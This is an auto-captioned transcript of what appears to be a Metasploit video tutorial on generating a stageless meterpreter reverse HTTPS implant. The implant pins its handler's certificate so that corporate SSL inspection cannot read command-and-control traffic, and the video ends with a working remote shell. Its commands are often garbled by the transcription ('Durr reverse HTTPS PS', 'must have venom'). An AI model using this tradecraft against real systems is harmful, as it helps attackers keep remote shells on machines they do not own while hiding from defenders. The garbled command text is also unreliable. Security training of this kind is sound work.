this time on Metasploit minute
Metasploit minute is brought to you by
viewers like you if you get value from
this show and can spare even a dollar
please consider contributing at
Metasploit minute calm
welcome to Metasploit minute the
breakdown on breaking in I'm your host
Rob fuller but you can call me movies
this time we're gonna be talking about a
cool way inside of matter / to do SSL
verification well how would this be
useful very easily when corporate
environments do SSL breaking or opening
or black boxing or busting the SSL
certificate chain however you want to
say it what it what they do is have a
valid certificate inside of their
corporate network that then they can do
SSL inspection in also if you have
someone doing a pineapple on you or or
any number of ways that you can get in
between SSL you want to make sure that
they can't see inside of your commands
doing whatever you're doing
valid ethical way of doing things yeah
so how do you do that well meterpreter
reverse HTTPS has the ability to do this
so we're gonna set up and we're going to
generate a binary first now inside of
this binary if you just do a reverse
HTTPS binary the problem is it's too
small the the shellcode itself just
wants to go get a stager and we talked
about the stage list some interpreters
before and you have to do it if you're
gonna generate a binary to do this this
way because the first stage of the
stager that comes out to pull down the
stage has to do that first before it has
enough of the information or shellcode
to do the verification so you might get
you know man in the middle if you make
the smaller binary first in the initial
connection but then you can set it up so
that it won't after that but we're gonna
shortcut that a bit and make the stage
lists binaries okay so the first way we
do that is use payload windows
interpreter
Durr reverse HTTPS PS we show our
options or as I'm still trying to
remember to do just type options set L
host to 1 zone 2 1 6 1 o 2.1 that's me
and we're gonna leave 8 4 4 3 in there
and then the next thing we got to do is
set stager verify certificate to true
now this option doesn't only do anything
by itself what it's just telling it to
is look into another option and do a
sha-1 of the hand of this of the SSL
certificate there and store that inside
of this stage or inside of this binary
that we're going to make so we have to
set up handler SSL cert we're going to
say our server dot PIM
now this server dot Pam and I'm sure you
guys can figure out or Stack Overflow a
way to generate an a self-signed cert or
make one your own or do anything else to
get a cert but it's in PEM format so it
comes with the SSL cert and then the key
inside of it that's together so we set
that up we do options again just to make
sure we got everything set up and
generate we're gonna say generate - T
and the reason why I use the payload
modules for generation of binaries it's
simply because it's easier I can walk
through each step I don't have to load I
must have venom every single time so T
and we can do - H just to show how that
works - t for exe and file we're gonna
put it in this evil directory called Bob
dot exe if you ever see Bob dot exe
running on one of your systems not
saying it's me but it probably is
because I named all of my binaries Bob
dog exe alright so we've generated that
and what we're gonna do hopefully
because what my Mac has been acting up
lately is drag and drop or copy and
paste this Bob DXE over to our our bad
guy so paste
okay so Bob dot exe is over there and
for some reason
hold on we actually set up and generated
the ROM Bob DXE the reason being is and
some of you might have caught this
already before I did is that this slash
means it's not staged --less so what we
have to actually do is go back into our
module and regenerate this but
unfortunately we have to set up all of
our options again 172 that 1/6 I want to
do that one set stage or verified a true
set in a handler cert to evil server dot
PEM ok so when I type generate again -
te xef evil Bob - DXE you'll notice one
very special thing meterpreter will
verify the SSL certificate with the
sha-1 hash of this that's the sha-1 of
the binary that I've just created out of
char one of the SSL certificate that the
handler is going to verify and you'll
also notice that the binary is actually
a lot bigger it's about a make so this
time we're gonna go back over here maybe
drag and drop no it's not gonna do
dragon dog ok
copy paste ok Bob - lets get rid of Bob
1 ok Bob two's over here now we have to
set up our handler to do that we just
have to type back or use exploit multi
handler and show options now we've
already got our payload setup in here
just because I prepped that and ready to
go but you could do a set payload and
I've got the other so let's just verify
all of our other stuff is there server
dot PEM set verify there we go and
that's set to true ok so if we type
exploit right now and set up our handler
our Bob exe should come in just fine but
what I want to show you how how this
works is by setting an incorrect SSL
cert so let's type in man-in-the-middle
PEM so we're gonna we're going to
pretend that our SSL cert is wrong or
someone's man-in-the-middle eNOS so
let's try exploit no exploit - Jay and
you can see that our sha-1 hash is
different so if we double click Bob - DX
see here's hoping it doesn't run and you
can see there's a UI UID something
something or getting redirecting stages
connection to somewhere else what
they're gonna see is that nothing's
actually working they're gonna see an
okay not like they're just not gonna see
anything come in so we're gonna see this
traffic go through if they're
man-in-the-middle eNOS depending on if
it lets it through or not that's all
they're gonna see now if we go and do
kill the Bob dot exe and we set up our
handler correctly exit go back in and
the reason I'm exiting is because
Metasploit for some reason or Ruby or
whatever if you set up a certificate
it's some time doesn't let it go I don't
know why just know that sometimes this
is how it works
so show options we said variables our
handler certs okay
type exploit again and we run Bob - we
should here's open get a shell and there
we go
sessions that's one iri one PWD tada
now that it works now what we could do
and I could show you later maybe in
another episode that even if I had a
invalid cert one time I could then have
a valid sort later or if they stopped
man in the middle of me or the person
goes home and they're mad at Miller's
the man in the middle is no longer there
it would actually work again but for
this instance since we don't have a
proxy setup to do the man in the middle
and then disconnect it or we're gonna
show you is and we're gonna stop right
there so let me tell so tell me what you
think msf at hack five org is how you
email us good positive feedback it's
